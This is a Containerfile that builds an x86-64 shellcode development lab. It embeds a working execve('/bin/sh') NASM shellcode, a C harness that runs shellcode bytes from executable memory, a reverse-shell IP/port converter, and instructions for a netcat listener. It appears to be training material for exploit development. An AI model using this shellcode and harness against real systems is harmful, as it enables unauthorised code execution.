# shellcode.Containerfile
# ────────────────────────────────────────────────────────────
# x86-64 Shellcode Development & Testing Environment
#
# Provides: nasm, gcc, binutils, gdb, strace, xxd, Python 3
#
# Build:
#   podman build -t shellcode -f shellcode.Containerfile .
#
# Run interactively:
#   podman run -it --rm shellcode
#
# For reverse shell testing, start a listener on the host first:
#   nc -lvnp 4444
# Then inside the container, configure your reverse shell
# payload with the host's IP (usually 10.0.2.2 or 172.17.0.1
# depending on podman networking mode).
#
# Mount a local directory for file persistence:
#   podman run -it --rm -v ./src:/src:Z shellcode
#
# ────────────────────────────────────────────────────────────

FROM docker.io/alpine:latest

# Install build tools and analysis utilities
RUN apk add --no-cache \
    nasm \
    gcc \
    musl-dev \
    make \
    binutils \
    gdb \
    strace \
    python3 \
    python3-dev \
    py3-pip \
    xxd \
    vim \
    tmux \
    bash \
    netcat-openbsd \
    curl \
    wget \
    htop \
    procps \
    util-linux \
    man-pages \
    man-db

# Create workspace
RUN mkdir -p /src && chmod 777 /src
WORKDIR /src

# ── Pre-built shellcode source files ──

# execve.nasm — spawns /bin/sh
RUN printf '%s\n' \
    'BITS 64' \
    'section .text' \
    'global _start' \
    '_start:' \
    '    ; execve("/bin/sh", NULL, NULL)' \
    '    xor rsi, rsi' \
    '    push rsi' \
    '    mov rdi, 0x68732f2f6e69622f' \
    '    push rdi' \
    '    mov rdi, rsp' \
    '    xor rdx, rdx' \
    '    push rsi' \
    '    push rdi' \
    '    mov rsi, rsp' \
    '    xor rax, rax' \
    '    mov al, 59' \
    '    syscall' \
    > /src/execve.nasm

# harness.c — C test harness for shellcode blobs
RUN printf '%s\n' \
    '#define _GNU_SOURCE' \
    '#include <stdio.h>' \
    '#include <stdlib.h>' \
    '#include <string.h>' \
    '#include <sys/mman.h>' \
    '#include <unistd.h>' \
    '' \
    'unsigned char payload[] = {' \
    '    /* Paste shellcode bytes from xxd -i output here */' \
    '    0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62,' \
    '    0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48,' \
    '    0x89, 0xe7, 0x48, 0x31, 0xd2, 0x56, 0x57, 0x48,' \
    '    0x89, 0xe6, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x0f,' \
    '    0x05' \
    '};' \
    '' \
    'int main(void) {' \
    '    size_t payload_len = sizeof(payload);' \
    '    void *exec_mem = mmap(NULL, payload_len,' \
    '        PROT_READ | PROT_WRITE | PROT_EXEC,' \
    '        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);' \
    '' \
    '    if (exec_mem == MAP_FAILED) {' \
    '        perror("mmap");' \
    '        return EXIT_FAILURE;' \
    '    }' \
    '' \
    '    memcpy(exec_mem, payload, payload_len);' \
    '' \
    '    printf("[+] Shellcode at %p, len=%zu bytes\n", exec_mem, payload_len);' \
    '    printf("[+] Jumping to shellcode...\n");' \
    '' \
    '    void (*fn)(void) = (void (*)(void)) exec_mem;' \
    '    fn();' \
    '' \
    '    fprintf(stderr, "[-] execve failed\n");' \
    '    munmap(exec_mem, payload_len);' \
    '    return EXIT_FAILURE;' \
    '}' \
    > /src/harness.c

# config.py — IP/port hex converter for reverse shell assembly
RUN printf '%s\n' \
    '#!/usr/bin/env python3' \
    'import socket' \
    'import sys' \
    '' \
    'def ip_to_hex(ip_str):' \
    '    packed = socket.inet_aton(ip_str)' \
    '    value = int.from_bytes(packed, "big")' \
    '    return f"0x{value:08x}"' \
    '' \
    'def port_to_hex(port):' \
    '    value = socket.htons(port)' \
    '    return f"0x{value:04x}"' \
    '' \
    'if __name__ == "__main__":' \
    '    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"' \
    '    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444' \
    '    print(f"%%define IP_ADDR  {ip_to_hex(ip)}     ; {ip}")' \
    '    print(f"%%define PORT     {port_to_hex(port)}  ; {port}")' \
    > /src/config.py

# verify-shellcode.sh — automated null-byte and size check
RUN printf '%s\n' \
    '#!/bin/bash' \
    'SHELLCODE_BIN="$1"' \
    'if [ -z "$SHELLCODE_BIN" ]; then' \
    '    echo "Usage: $0 <shellcode.bin>"' \
    '    exit 1' \
    'fi' \
    'SIZE=$(stat --format=%s "$SHELLCODE_BIN")' \
    'echo "[*] Size: $SIZE bytes"' \
    'NULLS=$(xxd -p "$SHELLCODE_BIN" | tr -d '\''\n'\'' | fold -w2 | grep -c "00")' \
    'if [ "$NULLS" -gt 0 ]; then' \
    '    echo "[!] $NULLS null bytes found"' \
    '    echo "Null byte offsets:"' \
    '    xxd "$SHELLCODE_BIN" | grep " 00"' \
    'else' \
    '    echo "[+] No null bytes"' \
    'fi' \
    > /src/verify-shellcode.sh
RUN chmod +x /src/verify-shellcode.sh /src/config.py

# Pre-compile the harness for immediate testing
RUN gcc -Wall -Wextra -o /src/harness /src/harness.c

# ── Workflow quick-start ──
RUN printf '%s\n' \
    '╔══════════════════════════════════════════════════════╗' \
    '║     Shellcode Development Lab                        ║' \
    '╠══════════════════════════════════════════════════════╣' \
    '║                                                      ║' \
    '║  Quick Start:                                        ║' \
    '║    nasm -f elf64 execve.nasm -o execve.o             ║' \
    '║    ld -s execve.o -o execve                          ║' \
    '║    objcopy -O binary execve execve.bin               ║' \
    '║    xxd -i execve.bin                                 ║' \
    '║    ./verify-shellcode.sh execve.bin                  ║' \
    '║                                                      ║' \
    '║  Edit harness.c, paste shellcode bytes, recompile:   ║' \
    '║    vim harness.c                                     ║' \
    '║    gcc -o harness harness.c                          ║' \
    '║    ./harness                                         ║' \
    '║                                                      ║' \
    '║  Debug with GDB:                                     ║' \
    '║    gdb ./harness                                     ║' \
    '║    > run                                             ║' \
    '║    > display/10i $rip                                ║' \
    '║    > si                                              ║' \
    '║                                                      ║' \
    '║  Trace syscalls:                                     ║' \
    '║    strace -e trace=execve,socket,connect ./harness   ║' \
    '║                                                      ║' \
    '╚══════════════════════════════════════════════════════╝' \
    > /etc/motd

CMD ["/bin/bash", "--rcfile", "/dev/null"]
